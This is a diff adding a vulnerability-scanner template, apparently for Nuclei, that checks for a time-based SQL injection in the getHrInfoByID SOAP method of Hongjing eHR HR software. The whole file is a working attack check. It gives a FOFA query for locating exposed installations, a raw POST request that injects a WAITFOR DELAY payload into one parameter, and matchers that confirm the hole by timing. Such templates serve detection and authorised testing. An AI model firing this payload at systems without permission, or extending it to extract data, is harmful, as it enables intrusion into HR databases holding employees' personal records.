@@ -1,0 +1,55 @@
+id: poc-yaml-hjsoft-ehr-gethrinfobyid-sqli
+info:
+  name: 宏景eHR getHrInfoByID SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 宏景eHR
+    fofa: app="HJSOFT-HCM"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /servlet/XFireServlet/HrpService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        SOAPAction: """
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <hrp:getHrInfoByID>
+                 <hrp:in0>1</hrp:in0>
+                 <hrp:in1>1'WAITFOR DELAY '0:0:{{t1}}</hrp:in1>
+                 <hrp:in2>1</hrp:in2>
+                 <hrp:in3>1</hrp:in3>
+                 <hrp:in4>1</hrp:in4>
+                 <hrp:in5>1</hrp:in5>
+                 <hrp:in6>1</hrp:in6>
+              </hrp:getHrInfoByID>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "HrpService"
+          - "getHrInfoByIDResponse"
+          - "传入的KEY值有错误"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
